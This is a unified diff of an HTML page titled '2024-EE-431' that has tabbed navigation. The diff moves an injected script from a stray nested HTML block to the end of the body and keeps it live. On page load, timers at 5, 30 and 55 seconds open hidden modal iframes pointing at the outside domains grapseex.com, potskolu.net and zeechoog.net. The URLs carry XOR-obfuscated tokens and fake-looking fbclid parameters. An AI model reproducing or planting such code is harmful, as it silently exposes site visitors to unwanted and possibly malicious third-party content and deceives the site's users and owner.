@@ -25,13 +25,6 @@
       .nav-item .tab-name { margin-right: 5px; }
       .nav-item .icon { margin-left: 5px; cursor: pointer; font-size: 0.9em; }
       .nav-item .add-tab { cursor: pointer; margin-left: 5px; }
-    </style>
-  </head>
-  <body>
-    <!DOCTYPE html>
-<html>
-<head>
-  <style>
     .modal {
       display: none;
       position: fixed;
@@ -53,54 +46,7 @@
       width: 80%;
     }
   </style>
-</head>
 <body>
-
-<script>
-  function xorEncryptDecrypt(input, key) {
-    let result = '';
-    for (let i = 0; i < input.length; i++) {
-      result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-    }
-    return result;
-  }
-
-  function generateUniqueToken() {
-    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-  }
-
-  function openModalWithLink(link) {
-    document.getElementById('modalIframe').src = link;
-    document.getElementById('myModal').style.display = 'block';
-  }
-
-  function closeModal() {
-    document.getElementById('myModal').style.display = 'none';
-  }
-
-  const encryptionKey = 'YourEncryptionKey';
-  const uniqueToken = generateUniqueToken();
-  const encryptedToken = xorEncryptDecrypt(uniqueToken, encryptionKey);
-
-  setTimeout(() => {
-    const link = '//grapseex.com/4/6878504?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 5000);
-
-  setTimeout(() => {
-    const link = '//potskolu.net/4/6724188?fbclid=lwAR2gjxl11OH7sNAJWylMygp6FNJ0yCwEyw9Gtnv-AVSTZBFAndNNFs9e2Ys?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 30000);
-
-  setTimeout(() => {
-    const link = '//zeechoog.net/4/6724187?fbclid=lwAR2fFXdCSR7fRebPTTXstnruq-1RfcvtRhg860c7-pONb1sWBSlpFkfera4?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 55000);
-</script>
-
 <!--The Modal-->
 <div class="modal" id="myModal">
   <div class="modal-content">
@@ -108,9 +54,7 @@
     <iframe id="modalIframe" style="border: none; height: 400px; width: 100%;"></iframe>
   </div>
 </div>
-
-</body>
-</html>
+  
     <div class="container">
       <h1 class="text-center mb-4">2024-EE-431</h1>
       <!-- Tabs Navigation -->
@@ -353,5 +297,49 @@
         }
       }
     </script>
+  <script>
+  function xorEncryptDecrypt(input, key) {
+    let result = '';
+    for (let i = 0; i < input.length; i++) {
+      result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+  }
+
+  function generateUniqueToken() {
+    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  }
+
+  function openModalWithLink(link) {
+    document.getElementById('modalIframe').src = link;
+    document.getElementById('myModal').style.display = 'block';
+  }
+
+  function closeModal() {
+    document.getElementById('myModal').style.display = 'none';
+  }
+
+  const encryptionKey = 'YourEncryptionKey';
+  const uniqueToken = generateUniqueToken();
+  const encryptedToken = xorEncryptDecrypt(uniqueToken, encryptionKey);
+
+  setTimeout(() => {
+    const link = '//grapseex.com/4/6878504?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 5000);
+
+  setTimeout(() => {
+    const link = '//potskolu.net/4/6724188?fbclid=lwAR2gjxl11OH7sNAJWylMygp6FNJ0yCwEyw9Gtnv-AVSTZBFAndNNFs9e2Ys?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 30000);
+
+  setTimeout(() => {
+    const link = '//zeechoog.net/4/6724187?fbclid=lwAR2fFXdCSR7fRebPTTXstnruq-1RfcvtRhg860c7-pONb1sWBSlpFkfera4?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 55000);
+</script>
   </body>
 </html>
